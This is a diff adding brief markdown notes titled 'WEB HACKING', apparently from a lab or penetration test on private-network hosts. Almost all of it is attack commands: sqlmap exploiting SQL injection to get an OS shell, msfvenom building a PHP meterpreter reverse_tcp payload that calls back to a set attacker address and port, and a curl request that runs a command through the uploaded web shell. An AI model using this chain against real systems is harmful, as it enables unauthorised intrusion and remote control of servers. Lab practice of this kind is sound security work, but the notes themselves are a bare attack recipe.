@@ -1,0 +1,19 @@
+## WEB HACKING
+
+Please ensure that the cookies of the post are the ones that are fresh if not is not going to work.
+
+sqlmap -r request_initial.txt --os-shell
+
+It is not enough, sqlmap has created an uploaded but still you have to create the payload for performing the reverse shell:
+
+http://10.0.2.247/php/tmpuhhxf.php
+
+You find the stager that sqlmap has created. 
+
+You create the payload that you are going to upload:
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.4 LPORT=4444 -f raw > shell.php
+
+curl "http://10.0.2.247:80/var/www/html/php/shell.php?cmd=id"
+
+
